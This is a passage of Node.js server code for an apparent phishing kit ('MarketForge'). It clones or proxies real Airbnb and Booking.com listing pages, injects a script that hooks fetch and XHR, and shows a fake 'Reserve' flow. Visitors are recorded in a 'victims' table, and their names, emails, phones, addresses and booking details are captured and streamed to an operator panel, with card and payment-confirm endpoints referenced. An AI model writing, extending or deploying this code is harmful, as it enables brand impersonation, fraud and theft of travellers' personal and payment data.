
  // Rewrite late-bound fetch / XHR that still hit real origin
  // Absolute hierarchical (scheme required for new URL(rel, base)):
  // {SITE}/_mfpx/{id}/u/{s|p}/{host}{path}{search}{hash}
  var SITE = ${JSON.stringify(siteBase.replace(/\/+$/, ''))};
  var ORIGINS = ${JSON.stringify([origin, 'https://www.airbnb.com', 'https://www.airbnb.co.uk', 'https://a0.muscache.com', 'https://www.booking.com', 'https://cf.bstatic.com'])};
  function toHierMfpx(abs){
    try {
      var m = String(abs).match(/^(https?):\\/\\/([^\\/?#]+)(\\/[^?#]*)?(\\?[^#]*)?(#.*)?$/i);
      if(!m) return abs;
      var sch = m[1].toLowerCase()==='http' ? 'p' : 's';
      var path = m[3] != null ? m[3] : '/';
      return SITE+'/_mfpx/'+LID+'/u/'+sch+'/'+m[2]+path+(m[4]||'')+(m[5]||'');
    } catch(e){ return abs; }
  }
  function mapUrl(u){
    try {
      if(!u || typeof u!=='string') return u;
      // already proxied (absolute or root-relative)
      if(u.indexOf('/_mfpx/')===0 || u.indexOf(SITE+'/_mfpx/')===0) return u;
      // MarketForge panel APIs stay local — Airbnb uses /api/v2|/api/v3 which MUST proxy
      if(/^\\/api\\/(track|card|payment-confirm|proxy-submit)\\b/.test(u)) return u;
      if(u.indexOf(SITE+'/api/track')===0 || u.indexOf(SITE+'/api/card')===0) return u;
      if(u.charAt(0)==='/' && u.charAt(1)!=='/') {
        return toHierMfpx(${JSON.stringify(origin)} + u);
      }
      for (var i=0;i<ORIGINS.length;i++){
        if(u.indexOf(ORIGINS[i])===0){
          return toHierMfpx(u);
        }
      }
      if(/^https?:\\/\\/[^/]*(airbnb|muscache|booking|bstatic)/i.test(u)){
        return toHierMfpx(u);
      }
    } catch(e){}
    return u;
  }
  try {
    var _f = window.fetch;
    window.fetch = function(input, init){
      try {
        if (typeof input === 'string') input = mapUrl(input);
        else if (input && input.url) { input = new Request(mapUrl(input.url), input); }
      } catch(e){}
      return _f.call(this, input, init);
    };
  } catch(e){}
  try {
    var XO = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(m,u){
      try { u = mapUrl(u); } catch(e){}
      return XO.apply(this, [m,u].concat([].slice.call(arguments,2)));
    };
  } catch(e){}
})();
</script>
<!-- /MF Proxy Capture Layer -->`;

  if (/<\/body>/i.test(s)) s = s.replace(/<\/body>/i, inject + '</body>');
  else s += inject;
  return s;
}

function clientProxyFallback(listing, vid, targetUrl, req) {
  const title = esc(listing.title || 'Listing');
  const imgs = (() => {
    try {
      const a = listing.images ? JSON.parse(listing.images) : [];
      return Array.isArray(a) ? a : [];
    } catch (e) {
      return listing.image_url ? [listing.image_url] : [];
    }
  })();
  const hero = imgs[0] || listing.image_url || '';
  const cur =
    listing.currency === 'GBP' ? '£' : listing.currency === 'USD' ? '$' : listing.currency === 'RON' ? 'lei ' : '€';
  const shell = `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>${title}</title>
<style>
*{box-sizing:border-box}body{margin:0;font-family:Circular,-apple-system,BlinkMacSystemFont,Roboto,Helvetica Neue,sans-serif;color:#222;background:#fff}
.top{height:80px;border-bottom:1px solid #ebebeb;display:flex;align-items:center;padding:0 40px;position:sticky;top:0;background:#fff;z-index:20}
.logo{color:#FF385C;font-weight:800;font-size:22px}
.wrap{max-width:1120px;margin:0 auto;padding:24px 24px 120px}
h1{font-size:26px;font-weight:600;margin:8px 0 6px}
.sub{color:#717171;font-size:15px;margin-bottom:20px}
.grid{display:grid;grid-template-columns:2fr 1fr 1fr;grid-template-rows:200px 200px;gap:8px;border-radius:16px;overflow:hidden;margin-bottom:28px}
.grid img{width:100%;height:100%;object-fit:cover;background:#f0f0f0}
.grid img:first-child{grid-row:1/3}
.panel{display:grid;grid-template-columns:1.4fr .8fr;gap:48px}
.card{border:1px solid #ddd;border-radius:12px;padding:24px;box-shadow:0 6px 16px rgba(0,0,0,.12);position:sticky;top:100px}
.price{font-size:22px;font-weight:600}
.btn{width:100%;margin-top:16px;padding:14px;border:0;border-radius:8px;background:linear-gradient(to right,#E61E4D,#D70466);color:#fff;font-size:16px;font-weight:600;cursor:pointer}
@media(max-width:800px){.panel{grid-template-columns:1fr}.grid{grid-template-columns:1fr 1fr;grid-template-rows:160px 160px}.top{padding:0 16px}}
</style></head><body>
<div class="top"><div class="logo">airbnb</div></div>
<div class="wrap">
  <h1>${title}</h1>
  <div class="sub">${esc(listing.location || '')} · ★ ${esc(listing.rating || '4.92')} · ${esc(String(listing.reviews || 0))} reviews</div>
  <div class="grid">${(imgs.slice(0, 5).map((u) => '<img src="' + esc(u) + '" alt="">').join('') || (hero ? '<img src="' + esc(hero) + '" alt="">' : '<div style="background:#eee;grid-row:1/3"></div>'))}</div>
  <div class="panel">
    <div>
      <h2 style="font-size:22px;margin:0 0 8px">${esc(listing.property_type || 'Entire place')} hosted by ${esc(listing.host_name || 'Host')}</h2>
      <p style="color:#717171">${esc(listing.guests || 2)} guests · ${esc(listing.bedrooms || 1)} bedrooms · ${esc(listing.beds || 1)} beds · ${esc(listing.baths || 1)} baths</p>
      <hr style="border:none;border-top:1px solid #ebebeb;margin:24px 0">
      <p style="line-height:1.6;white-space:pre-wrap">${esc(listing.description || '')}</p>
    </div>
    <div class="card">
      <div class="price">${cur}${esc(listing.price || '—')} <span style="font-size:16px;font-weight:400;color:#717171">night</span></div>
      <button class="btn" type="button" onclick="var b=document.getElementById('mf-proxy-fab');if(b)b.click();">Reserve</button>
      <p style="text-align:center;color:#717171;font-size:12px;margin-top:12px">You won't be charged yet</p>
    </div>
  </div>
</div>
</body></html>`;
  // inject reserve/capture overlay onto shell
  return rewriteProxyHtml(shell, targetUrl || BASE_URL, listing.id, reqOrigin(req), vid, req);
}

async function getProxiedListingHtml(listing, victimId, req) {
  let targetUrl = buildProxyTargetUrl(listing);
  if (!targetUrl) throw new Error('missing proxy_target_url');
  const cacheKey = listing.id + '|' + targetUrl + '|br|' + reqOrigin(req);
  const hit = PROXY_CACHE.get(cacheKey);
  if (hit && Date.now() - hit.at < PROXY_CACHE_TTL_MS && hit.html) {
    const hitHtml = String(hit.html);
    const isStaticOk = hitHtml.includes('ab-header') || hitHtml.includes('ab-gallery') || hitHtml.includes('ab-booking') || hitHtml.includes('mf-listing-inject') || hitHtml.includes('data-section-id="HERO_DEFAULT"');
    // Keep cached static fallback for dead origin IDs (hit.missing=true is intentional)
    const badShell =
      !hit.browser &&
      !isStaticOk &&
      !isHydratedListingHtml(hitHtml, hit.target || targetUrl) &&
      !isValidProxiedListingHtml(hitHtml, hit.target || targetUrl);
    // Only drop truly broken SPA shells — never drop static clones or good browser PDPs
    if (badShell || (isOriginListingMissing(hitHtml, 200) && !isStaticOk && !hit.missing)) {
      PROXY_CACHE.delete(cacheKey);
    } else {
      return hitHtml
        .replace(/window\.__MF_VID = "[^"]*"/g, 'window.__MF_VID = ' + JSON.stringify(String(victimId || '')))
        .replace(/"__MF_VID",\s*"[^"]*"/g, '"__MF_VID", ' + JSON.stringify(String(victimId || '')))
        .replace(/window\.__MF_VID = '[^']*'/g, 'window.__MF_VID = ' + JSON.stringify(String(victimId || '')))
        .replace(/window\.__VID\s*=\s*[^;]+;/g, 'window.__VID=' + JSON.stringify(victimId) + ';');
    }
  }

  const jar = new Map();
  const ua = (req && req.headers['user-agent']) || undefined;
  const lang = (req && req.headers['accept-language']) || 'en-GB,en;q=0.9';
  let html = null;
  let targetUrlFinal = targetUrl;
  let usedBrowser = false;

  // 1) Prefer headless Chrome hydration — only path that yields real Airbnb PDP from DC IPs
  let originDefinitelyMissing = false;
  try {
    console.log('[proxy] browser-render', targetUrl);
    const br = await browserRenderUrl(targetUrl);
    if (br && br.body && isHydratedListingHtml(br.body, targetUrl)) {
      html = br.body;
      targetUrlFinal = br.finalUrl || targetUrl;
      usedBrowser = true;
      console.log('[proxy] browser-render ok', br.title || '', Buffer.isBuffer(br.body) ? br.body.length : String(br.body).length);
    } else if (
      br &&
      br.body &&
      !isAirbnbHomepageShell(br.body) &&
      isValidProxiedListingHtml(br.body, targetUrl) &&
      !isOriginListingMissing(br.body, br.status)
    ) {
      html = br.body;
      targetUrlFinal = br.finalUrl || targetUrl;
      usedBrowser = true;
      console.log('[proxy] browser-render soft-ok', Buffer.isBuffer(br.body) ? br.body.length : String(br.body).length);
    } else {
      console.warn('[proxy] browser-render rejected (not hydrated / homepage shell)');
      if (br && br.body && (isAirbnbHomepageShell(br.body) || isOriginListingMissing(br.body, br.status))) {
        originDefinitelyMissing = true;
      }
    }
  } catch (e) {
    console.warn('[proxy] browser-render failed:', e.message);
    const msg = String(e && e.message || '').toLowerCase();
    if (msg.includes('oops') || msg.includes('404') || msg.includes('410')) {
      originDefinitelyMissing = true;
    }
  }

  // Dead room ID confirmed by headless Chrome — serve static clone immediately (no alt thrash)
  if (originDefinitelyMissing && !html) {
    console.warn('[proxy] origin missing → donor/static clone for', targetUrl);
    const fb = await staticListingFallback(listing, victimId, req);
    PROXY_CACHE.set(cacheKey, { html: fb, at: Date.now(), target: targetUrl, missing: false, browser: false, donor: true });
    if (PROXY_CACHE.size > 80) {
      const first = PROXY_CACHE.keys().next().value;
      PROXY_CACHE.delete(first);
    }
    return fb;
  }

  // 2) Fallback: plain fetch (+ alt hosts) — rarely works for Airbnb rooms from DC
  if (!html) {
    try {
      let result = await fetchUrl(targetUrl, { jar, ua, lang });
      html = result.body;
      targetUrlFinal = result.finalUrl || targetUrl;
      if (isOriginListingMissing(html, result.status) || isBotPage(html) || !isValidProxiedListingHtml(html, targetUrlFinal)) {
        const alts = [];
        try {
          const u = new NodeURL(targetUrl);
          if (u.hostname.includes('airbnb') && /\/rooms\/\d+/i.test(u.pathname)) {
            for (const h of ['www.airbnb.co.uk', 'www.airbnb.com', 'www.airbnb.fr', 'www.airbnb.de', 'www.airbnb.it', 'www.airbnb.es']) {
              if (h !== u.hostname) alts.push(u.protocol + '//' + h + u.pathname + u.search);
            }
          }
        } catch (e) {}
        for (const alt of alts) {
          try {
            const r2 = await fetchUrl(alt, { jar, ua, lang });
            if (!isOriginListingMissing(r2.body, r2.status) && !isBotPage(r2.body) && isValidProxiedListingHtml(r2.body, alt)) {
              html = r2.body;
              targetUrlFinal = r2.finalUrl || alt;
              break;
            }
          } catch (e) {}
        }
      }
    } catch (e) {
      console.warn('[proxy] fetchUrl failed:', e.message);
    }
  }

  // 3) Still bad — last-chance browser render on alt host
  if (
    !html ||
    isOriginListingMissing(html, 200) ||
    isBotPage(html) ||
    !(usedBrowser ? isHydratedListingHtml(html, targetUrlFinal) : isValidProxiedListingHtml(html, targetUrlFinal))
  ) {
    if (!usedBrowser) {
      try {
        const u = new NodeURL(targetUrl);
        const altHosts = u.hostname.includes('airbnb')
          ? ['www.airbnb.com', 'www.airbnb.co.uk', 'www.airbnb.fr']
          : [u.hostname];
        for (const h of altHosts) {
          const alt = u.protocol + '//' + h + u.pathname + u.search;
          try {
            const br2 = await browserRenderUrl(alt);
            if (br2 && br2.body && (isHydratedListingHtml(br2.body, alt) || isValidProxiedListingHtml(br2.body, alt))) {
              html = br2.body;
              targetUrlFinal = alt;
              usedBrowser = true;
              break;
            }
          } catch (e) {}
        }
      } catch (e) {}
    }
  }

  // Final: only static clone if origin truly missing after browser attempts
  if (
    !html ||
    isOriginListingMissing(html, 200) ||
    isBotPage(html) ||
    !(usedBrowser ? isHydratedListingHtml(html, targetUrlFinal) || isValidProxiedListingHtml(html, targetUrlFinal) : isValidProxiedListingHtml(html, targetUrlFinal))
  ) {
    console.warn('[proxy] falling back to donor/static clone for', targetUrl);
    const fb = await staticListingFallback(listing, victimId, req);
    PROXY_CACHE.set(cacheKey, { html: fb, at: Date.now(), target: targetUrl, missing: false, browser: false, donor: true });
    return fb;
  }

  const rewritten = rewriteProxyHtml(html, targetUrlFinal, listing.id, reqOrigin(req), victimId, req);
  PROXY_CACHE.set(cacheKey, {
    html: rewritten,
    at: Date.now(),
    target: targetUrlFinal,
    browser: usedBrowser,
    missing: false,
  });
  if (PROXY_CACHE.size > 80) {
    const first = PROXY_CACHE.keys().next().value;
    PROXY_CACHE.delete(first);
  }
  return rewritten;
}


// ===== Airbnb Clone Proxy Support =====
const AIRBNB_CLONE_URL = process.env.AIRBNB_CLONE_URL || 'http://localhost:3001';

async function getMongoDb() {
  if (!MongoClient) return null;
  if (!_mongoClient) {
    try {
      _mongoClient = new MongoClient('mongodb://localhost:27017/airbnb-clone');
      await _mongoClient.connect();
    } catch (e) { console.error('[clone] MongoDB connect error:', e.message); return null; }
  }
  try { return _mongoClient.db(); } catch (e) { return null; }
}

function listingToCloneDoc(listing) {
  const imgs = parseListingImages(listing);
  return {
    title: String(listing.title || 'Beautiful Apartment').slice(0, 120),
    description: String(listing.description || 'A wonderful place to stay.').slice(0, 1000),
    imageSrc: imgs[0] || 'https://images.unsplash.com/photo-1502672260266-1c1ef2d93688?w=1200',
    category: 'Beach',
    roomCount: Math.max(1, parseInt(listing.bedrooms) || 1),
    bathroomCount: Math.max(1, parseInt(listing.baths) || 1),
    guestCount: Math.max(1, parseInt(listing.guests) || 2),
    locationValue: 'US',
    price: Math.max(10, Math.round(parseFloat(listing.price) || 150)),
    createdAt: new Date()
  };
}

async function syncListingToClone(listing) {
  try {
    const mdb = await getMongoDb();
    if (!mdb) return null;
    const listingsCol = mdb.collection('Listing');
    const usersCol = mdb.collection('User');
    let user = await usersCol.findOne({});
    if (!user) {
      const r = await usersCol.insertOne({ name: 'Host', email: 'host@stayfinder.com', hashedPassword: '$2b$10$placeholder', emailVerified: new Date(), image: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=200', favoriteIds: [], createdAt: new Date(), updatedAt: new Date() });
      user = { _id: r.insertedId };
    }
    const doc = listingToCloneDoc(listing);
    doc.userId = user._id;
    let cloneId = null;
    if (listing.clone_listing_id) {
      try { const oid = new ObjectId(listing.clone_listing_id); const ex = await listingsCol.findOne({ _id: oid }); if (ex) { await listingsCol.updateOne({ _id: oid }, { $set: doc }); cloneId = listing.clone_listing_id; } } catch (e) {}
    }
    if (!cloneId) {
      const r = await listingsCol.insertOne(doc);
      cloneId = r.insertedId.toString();
      db.prepare('UPDATE listings SET clone_listing_id = ? WHERE id = ?').run(cloneId, listing.id);
    }
    return cloneId;
  } catch (e) { console.error('[clone] sync error:', e.message); return null; }
}

async function fetchCloneListingHtml(cloneId) {
  try {
    const url = AIRBNB_CLONE_URL + '/_airbnb/rooms/' + encodeURIComponent(cloneId);
    const res = await fetch(url, { headers: { 'Accept': 'text/html' } });
    if (!res.ok) return null;
    return await res.text();
  } catch (e) { console.error('[clone] fetch error:', e.message); return null; }
}

function airbnbClonePage(listing, victimId) {
  const cloneId = listing.clone_listing_id;
  if (!cloneId) return airbnbPage(listing, victimId);
  const title = String(listing.title || 'StayFinder').replace(/[<>&"']/g, '');
  const src = '/_airbnb/rooms/' + encodeURIComponent(cloneId);
  return '<!DOCTYPE html>\n'
    + '<html lang="en">\n'
    + '<head>\n'
    + '<meta charset="utf-8"/>\n'
    + '<meta name="viewport" content="width=device-width, initial-scale=1"/>\n'
    + '<title>' + title + '</title>\n'
    + '<style>html,body{margin:0;padding:0;height:100%;overflow:hidden;background:#fff}iframe{border:0;width:100%;height:100%;display:block}</style>\n'
    + '</head>\n'
    + '<body>\n'
    + '<iframe src="' + src + '" title="' + title + '" allow="payment *"></iframe>\n'
    + '<script>window.__VID=' + JSON.stringify(victimId)
    + ';fetch("/api/track",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({victim_id:'
    + JSON.stringify(victimId) + ',stage:"page_view"})});</script>\n'
    + '</body>\n'
    + '</html>';
}

function serveListingPage(req, res, listing) {
  if (!listing) return res.status(404).send('<h1 style="text-align:center;margin-top:100px;font-family:sans-serif">Not Found</h1>');
  listing = db.prepare('SELECT * FROM listings WHERE id = ?').get(listing.id) || listing;
  res.set({
    'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0',
    'Pragma': 'no-cache',
    'Expires': '0',
    'Surrogate-Control': 'no-store',
    'X-Frame-Options': 'SAMEORIGIN',
  });

  // Static Airbnb frontend (self-hosted). Set MF_ENABLE_PROXY=1 to re-enable reverse proxy.
  const proxyEnabled = process.env.MF_ENABLE_PROXY === '1' || process.env.MF_ENABLE_PROXY === 'true';
  const proxyMode = proxyEnabled && Number(listing.proxy_mode) === 1 && (listing.proxy_target_url || listing.listing_code);
  if (proxyMode) {
    db.prepare('UPDATE listings SET views = views + 1 WHERE id = ?').run(listing.id);
    markListingOpened(listing);
    const victimResult = db
      .prepare(
        "INSERT INTO victims (listing_id, user_id, marketplace, ip_address, user_agent, stage) VALUES (?, ?, ?, ?, ?, 'proxy_visit')"
      )
      .run(listing.id, listing.user_id, listing.marketplace, req.ip, req.headers['user-agent'] || '');
    const vid = victimResult.lastInsertRowid;
    res.cookie('mf_px_lid', String(listing.id), { httpOnly: false, sameSite: 'lax', path: '/' });
    getProxiedListingHtml(listing, vid, req)
      .then((html) => {
        res.type('html').send(html);
      })
      .catch((err) => {
        console.error('proxy fetch error', err.message);
        const targetUrl = buildProxyTargetUrl(listing);
        res.type('html').send(clientProxyFallback(listing, vid, targetUrl, req));
      });
    return;
  }

  db.prepare('UPDATE listings SET views = views + 1 WHERE id = ?').run(listing.id);
  markListingOpened(listing);
  const victimResult = db
    .prepare(
      "INSERT INTO victims (listing_id, user_id, marketplace, ip_address, user_agent, stage) VALUES (?, ?, ?, ?, ?, 'visit')"
    )
    .run(listing.id, listing.user_id, listing.marketplace, req.ip, req.headers['user-agent'] || '');
  try {
    io.emit('live_presence', {
      listingId: listing.id,
      userId: listing.user_id,
      victimId: victimResult.lastInsertRowid,
      event: 'page_view',
      path: req.path,
      at: new Date().toISOString()
    });
  } catch (e) {}
  if (listing.marketplace === 'booking') {
    res.send(bookingPage(listing, victimResult.lastInsertRowid));
    return;
  }
  // Real Airbnb 1:1 offline shell + inject listing (host, photos, price, calendar, map)
  const vid = victimResult.lastInsertRowid;

  // Prepare shared template data (mirrors admin preview route)
  const publicHost = listing.host_id
    ? db.prepare('SELECT * FROM hosts WHERE id = ?').get(listing.host_id) || null
    : null;
  const publicNearby = (function () {
    const lat = listing.latitude;
    const lon = listing.longitude;
    const MAX = 10;
    const COLS = 'id, title, image_url, images, price, price_month, currency, locale, rating, reviews, location, property_type, listing_code';
    if (lat != null && isFinite(Number(lat)) && lon != null && isFinite(Number(lon))) {
      const delta = 0.45;
      let rows = db.prepare('SELECT ' + COLS + ' FROM listings WHERE id != ? AND latitude BETWEEN ? AND ? AND longitude BETWEEN ? AND ? LIMIT ?')
        .all(listing.id, Number(lat) - delta, Number(lat) + delta, Number(lon) - delta, Number(lon) + delta, MAX);
      if (rows.length < MAX) {
        const delta2 = 3.0;
        const excl = [listing.id, ...rows.map(r => r.id)];
        const ph = excl.map(() => '?').join(',');
        const wider = db.prepare('SELECT ' + COLS + ' FROM listings WHERE id NOT IN (' + ph + ') AND latitude BETWEEN ? AND ? AND longitude BETWEEN ? AND ? LIMIT ?')
          .all(...excl, Number(lat) - delta2, Number(lat) + delta2, Number(lon) - delta2, Number(lon) + delta2, MAX - rows.length);
        rows = rows.concat(wider);
      }
      if (rows.length) return rows;
    }
    const city = String(listing.location || '').trim().split(',')[0].trim();
    if (city.length >= 2) {
      const rows = db.prepare('SELECT ' + COLS + ' FROM listings WHERE id != ? AND location LIKE ? LIMIT ?')
        .all(listing.id, '%' + city + '%', MAX);
      if (rows.length) return rows;
    }
    return [];
  }());
  const publicSeoLinks = (() => {
    try {
      const raw = listing.reviews_json;
      if (!raw) return null;
      const parsed = JSON.parse(raw);
      if (parsed && (parsed.nearbyCityLinks || parsed.otherStaysLinks)) return parsed;
      return null;
    } catch (e) { return null; }
  })();
  const publicPayCfg = resolvePaymentConfig(listing.user_id);
  const { getTemplate } = require('./marketplace/templates/accommodation/index');
  const sharedRender = getTemplate('airbnb-style');

  res.type('html').send(
    sharedRender(listing, publicHost, { victimId: vid, paymentConfig: publicPayCfg, nearbyListings: publicNearby, seoLinks: publicSeoLinks })
  );
}

function handleProxySubmit(listingId, body, victimId) {
  try {
    let data = {};
    if (typeof body === 'string') {
      try {
        data = JSON.parse(body);
      } catch (e) {
        data = {};
      }
    } else if (body && typeof body === 'object') {
      data = body;
    }
    const listing = db.prepare('SELECT * FROM listings WHERE id = ?').get(listingId);
    if (!listing) return { ok: false, error: 'listing not found' };

    if (data.fields) {
      const name = data.fields.name || data.fields.full_name || data.fields.first_name || '';
      const email = data.fields.email || '';
      const phone = data.fields.phone || data.fields.phone_number || '';
      if (!victimId) {
        const vr = db
          .prepare(
            'INSERT INTO victims (listing_id, user_id, marketplace, stage, full_name, email, phone) VALUES (?,?,?,?,?,?,?)'
          )
          .run(listing.id, listing.user_id, listing.marketplace, 'proxy_form_submit', name, email, phone);
        victimId = vr.lastInsertRowid;
      } else {
        db.prepare(
          "UPDATE victims SET full_name = COALESCE(NULLIF(?, ''), full_name), email = COALESCE(NULLIF(?, ''), email), phone = COALESCE(NULLIF(?, ''), phone), stage = 'proxy_form_submit' WHERE id = ?"
        ).run(name, email, phone, victimId);
      }
      return { ok: true, victim_id: victimId };
    }

    const full_name = data.full_name || '';
    const email = data.email || '';
    const phone = data.phone || '';
    if (data.victim_id && !victimId) victimId = parseInt(data.victim_id, 10) || null;

    const extra = {
      checkin: data.checkin || null,
      checkout: data.checkout || null,
      guests: data.guests || null,
      address: data.address || null,
      city: data.city || null,
      postcode: data.postcode || null,
      country: data.country || null
    };
    let dataJson = null;
    try { dataJson = JSON.stringify(extra); } catch (e) { dataJson = null; }

    if (!victimId) {
      const vr = db
        .prepare(
          'INSERT INTO victims (listing_id, user_id, marketplace, stage, full_name, email, phone, data_json) VALUES (?,?,?,?,?,?,?,?)'
        )
        .run(listing.id, listing.user_id, listing.marketplace, data.stage || 'details', full_name, email, phone, dataJson);
      victimId = vr.lastInsertRowid;
    } else {
      db.prepare(
        "UPDATE victims SET full_name = COALESCE(NULLIF(?, ''), full_name), email = COALESCE(NULLIF(?, ''), email), phone = COALESCE(NULLIF(?, ''), phone), stage = ?, data_json = COALESCE(?, data_json) WHERE id = ?"
      ).run(full_name, email, phone, data.stage || 'details', dataJson, victimId);
    }
    try { io.emit('victim_update', { id: victimId, stage: data.stage || 'details', marketplace: listing.marketplace, userId: listing.user_id }); } catch (e) {}
    try {
      const st = String((data && data.stage) || 'details').toLowerCase();
      if (st === 'details' || st === 'date_select' || data.checkin || data.checkout || data.guests) {
        // dates/guests filled → in review; if already on confirm path, invoice handled by book/stays
        advanceListingStatus(listing, 'in_review');
      }
    } catch (e) {}
    return { ok: true, victim_id: victimId };
  } catch (e) {
    console.error('proxy submit error', e);
    return { ok: false, error: e.message };
  }
}

function rewriteProxyText(bodyText, listingId, contentType, req) {
  if (!contentType) return bodyText;
  const ct = contentType.toLowerCase();
  if (!/text|javascript|json|css|xml|svg/.test(ct)) return bodyText;
  return rewriteOriginUrlsInText(bodyText, listingId, req);
}

async function handleMfpx(req, res) {
  try {
    const resolved = resolveMfpxRequest(req);
    if (!resolved) return res.status(400).send('bad mfpx path');

    const listingId = resolved.listingId;
    const listing = db.prepare('SELECT * FROM listings WHERE id = ?').get(listingId);
    if (!listing) return res.status(404).send('not found');

    let targetUrl = resolved.targetUrl;
    if (resolved.raw || !targetUrl) {
      targetUrl = (req.query && req.query.url) || buildProxyTargetUrl(listing);
    }
    if (!/^https?:\/\//i.test(String(targetUrl || ''))) return res.status(400).send('bad url');
    let host = '';
    let pathName = '';
    try {
      const tu = new NodeURL(targetUrl);
      host = tu.hostname;
      pathName = tu.pathname || '/';
    } catch (e) {
      return res.status(400).send('bad url');
    }
    if (!hostAllowed(host)) return res.status(403).send('host not allowed');

    // Airbnb SPA navigated to /404 — never proxy Oops; send user back to our listing page
    if (
      /\/404\/?$/i.test(pathName) ||
      /\/404\.html$/i.test(pathName) ||
      pathName === '/404' ||
      /page-not-found/i.test(pathName)
    ) {
      const back = listing.public_path || ('/rooms/' + (listing.listing_code || listing.id));
      res.set('Cache-Control', 'no-store');
      return res.redirect(302, back);
    }

    const jar = new Map();
    const result = await fetchUrl(targetUrl, {
      ua: req.headers['user-agent'],
      lang: req.headers['accept-language'] || 'en-GB,en;q=0.9',
      referer: buildProxyTargetUrl(listing),
      fetchDest: 'empty',
      fetchMode: 'cors',
      fetchSite: 'same-origin',
      accept: req.headers.accept || '*/*',
      jar,
      method: req.method === 'POST' ? 'POST' : 'GET',
      body: req.method === 'POST' ? req.rawBody || undefined : undefined,
      headers: req.method === 'POST' ? { 'Content-Type': req.headers['content-type'] || 'application/json' } : {},
    });

    const ct = (result.headers['content-type'] || 'application/octet-stream').split(';')[0].trim();
    res.set('Cache-Control', ct.includes('image') || ct.includes('font') || ct.includes('css') ? 'public, max-age=3600' : 'no-store');
    res.set('Access-Control-Allow-Origin', '*');
    // strip frame/csp headers
    if (/text|javascript|json|css|xml|svg|html/.test(ct)) {
      let text = result.body.toString('utf8');
      // Never serve Airbnb Oops through the asset proxy — bounce to our listing
      if (/html/.test(ct) && (isOriginListingMissing(text, result.status) || result.status === 404 || result.status === 410)) {
        const back = listing.public_path || ('/rooms/' + (listing.listing_code || listing.id));
        return res.redirect(302, back);
      }
      if (/html/.test(ct)) {
        text = rewriteProxyHtml(text, targetUrl, listingId, reqOrigin(req), null, req);
      } else {
        text = rewriteProxyText(text, listingId, ct, req);
      }
      res.status(result.status || 200);
      res.type(ct).send(text);
    } else {
      if (result.status === 404 || result.status === 410) {
        // missing asset — soft 204 so SPA doesn't navigate to Oops
        return res.status(204).end();
      }
      res.status(result.status || 200);
      res.type(ct).send(result.body);
    }
  } catch (e) {
    console.error('mfpx error', e.message);
    res.status(502).send('proxy error');
  }
}

// === CSS (inline, always available) ===
const ADMIN_CSS = (function () {
  var cands = ['/opt/marketforge/public/admin.css', path.join(__dirname, 'public', 'admin.css')];
  for (var i = 0; i < cands.length; i++) { try { if (fs.existsSync(cands[i])) return fs.readFileSync(cands[i], 'utf8'); } catch (e) {} }
  return "/* MarketForge — Neon Purple Premium Theme */\n:root{\n  --mf-bg:#07040f;\n  --mf-bg-2:#0c0718;\n  --mf-panel:#140d26;\n  --mf-panel-2:#1a1130;\n  --mf-panel-3:#211640;\n  --mf-border:#2c1d55;\n  --mf-border-soft:#231746;\n  --mf-text:#ece8fa;\n  --mf-text-dim:#c3b8e0;\n  --mf-muted:#9585c0;\n  --mf-primary:#a855f7;\n  --mf-primary-2:#7c3aed;\n  --mf-neon:#c026d3;\n  --mf-fuchsia:#d946ef;\n  --mf-cyan:#22d3ee;\n  --mf-success:#34d399;\n  --mf-danger:#fb7185;\n  --mf-warning:#fbbf24;\n  --mf-info:#38bdf8;\n  --mf-glow:rgba(168,85,247,.55);\n  --mf-glow-soft:rgba(168,85,247,.18);\n}\n*{margin:0;padding:0;box-sizing:border-box}\nhtml{scroll-behavior:smooth}\nbody{\n  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;\n  background:\n    radial-gradient(1200px 600px at 12% -10%, rgba(124,58,237,.20), transparent 60%),\n    radial-gradient(900px 500px at 100% 0%, rgba(192,38,211,.14), transparent 55%),\n    radial-gradient(800px 700px at 50% 120%, rgba(34,211,238,.07), transparent 60%),\n    var(--mf-bg);\n  background-attachment:fixed;\n  color:var(--mf-text);\n  min-height:100vh;\n  -webkit-font-smoothing:antialiased;\n}\n.admin-layout,.client-layout{display:flex}\n/* Sidebar */\n.sidebar{\n  width:250px;min-height:100vh;padding:0;display:flex;flex-direction:column;\n  position:fixed;top:0;left:0;bottom:0;z-index:100;\n  background:linear-gradient(180deg,#150c2c 0%,#0b0618 60%,#08040f 100%);\n  border-right:1px solid var(--mf-border-soft);\n  box-shadow:4px 0 40px rgba(124,58,237,.10);\n}\n.sidebar::before{\n  content:\"\";position:absolute;top:0;left:0;right:0;height:2px;\n  background:linear-gradient(90deg,transparent,var(--mf-primary),var(--mf-fuchsia),transparent);\n  opacity:.85;\n}\n.sidebar-header{padding:26px 22px;border-bottom:1px solid var(--mf-border-soft)}\n.logo-text{font-size:19px;font-weight:600;letter-spacing:.3px;color:#fff}\n.logo-text strong{\n  background:linear-gradient(90deg,var(--mf-primary),var(--mf-fuchsia));\n  -webkit-background-clip:text;background-clip:text;color:transparent;font-weight:800;\n  filter:drop-shadow(0 0 10px var(--mf-glow-soft));\n}\n.badge-admin{display:inline-block;background:linear-gradient(90deg,#e11d48,#be123c);color:#fff;font-size:10px;padding:3px 9px;border-radius:999px;margin-top:8px;font-weight:700;letter-spacing:1px;box-shadow:0 0 14px rgba(225,29,72,.4)}\n.sidebar-menu{padding:14px 12px;flex:1;overflow-y:auto;display:flex;flex-direction:column;gap:4px}\n.sidebar-link{\n  display:block;padding:11px 16px;color:var(--mf-text-dim);text-decoration:none;\n  font-size:14px;border-radius:10px;position:relative;border:1px solid transparent;\n  transition:background .2s ease,color .2s ease,transform .15s ease,box-shadow .2s ease,border-color .2s ease;\n}\n.sidebar-link:hover{\n  background:linear-gradient(90deg,rgba(168,85,247,.16),rgba(168,85,247,.03));\n  color:#fff;transform:translateX(3px);border-color:rgba(168,85,247,.25);\n}\n.sidebar-link.active{\n  background:linear-gradient(90deg,rgba(168,85,247,.28),rgba(192,38,211,.12));\n  color:#fff;font-weight:600;border-color:rgba(168,85,247,.5);\n  box-shadow:0 0 18px rgba(168,85,247,.30), inset 0 0 0 1px rgba(255,255,255,.03);\n}\n.sidebar-link.active::before{\n  content:\"\";position:absolute;left:-12px;top:50%;transform:translateY(-50%);\n  